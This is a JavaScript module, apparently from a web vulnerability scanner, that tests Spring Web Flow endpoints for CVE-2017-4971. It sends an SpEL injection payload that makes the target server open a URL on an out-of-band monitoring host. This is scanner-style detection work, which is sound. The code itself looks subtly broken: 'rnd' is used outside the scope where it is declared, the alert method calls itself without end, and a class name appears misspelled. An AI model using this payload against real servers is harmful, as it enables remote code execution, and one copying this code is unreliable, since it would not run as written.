const { CoreLayer, createReport, browerHttpJob } = require('../core/core.js');

class SpringWebFlowSPELRCECVE20174971 extends CoreLayer {
    constructor(coreobj) {
        super(coreobj);
    }

    async startTesting() {

        const acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
        const flow = ax.loadModule("/lib/utility/flow.js").flow(this.scanState);
        const rnd = ax.loadModule("/lib/utility/random.js");

        if (!acumonitor.checkAcumonitor(this.scanState)) {
            return;
        }

        // Only interested in POST Spring Web Flow URLs e.g. ?execution=e1s1
        // also filter by content-type
        if (this.scriptArg.http.request.method === "POST" &&
            this.scriptArg.http.request.isType("application/x-www-form-urlencoded")) {
            const match = this.scriptArg.http.request.uri.match(/\?execution=(e\d+s\d+)$/);
            if (match && match.length > 0) {
                const flowId = match[1];
                await flow.callIdOnce(
                    `spring-web-flow-${this.scriptArg.http.hostname}-${flowId}`,
                    this.testVulnerability.bind(this)
                );
            }
        }

    }

    async testVulnerability() {
        console.log(`Testing on URI: ${this.scriptArg.http.request.uri}`);

        // Prepare job from the current request scriptArg.http.request
        const job = new browerHttpJob();
        job.setUrl(this.scriptArg.target.url);
        job.request.assign(this.scriptArg.http.request);

        // Prepare AcuMonitor token and url
        const rndToken = `hit${rnd.randStrDigits(10)}`;
        const url = `http://${rndToken}.${acumonitor.AMServer}/`;

        // Adjust the request body
        job.request.body = `&_new java.net.URL('${url}').openStream()=`;

        // Make http request
        const http = await job.execute();

        if (!http.error) {
            // Verify with AcuMonitor
            const result = acumonitor.verifyInjectionHTTP(rndToken);
            if (result) {
                // Alert only once per scan
                await flow.callIdOnce(
                    `spring-web-flow-alert-${this.scriptArg.http.hostname}`,
                    this.alert.bind(this, http, result)
                );
            }
        }
        
    }

    alert(http, acumonitor_data) {
        const msg = {
            url: this.url,
            body: "",
            payload: "",
            vuln: this.getVulnId(__filename),
            level: "h"
        };
        this.alert(createReport(msg));
    }
}

module.exports = SpringWebFlowSPELRCECVE20174971;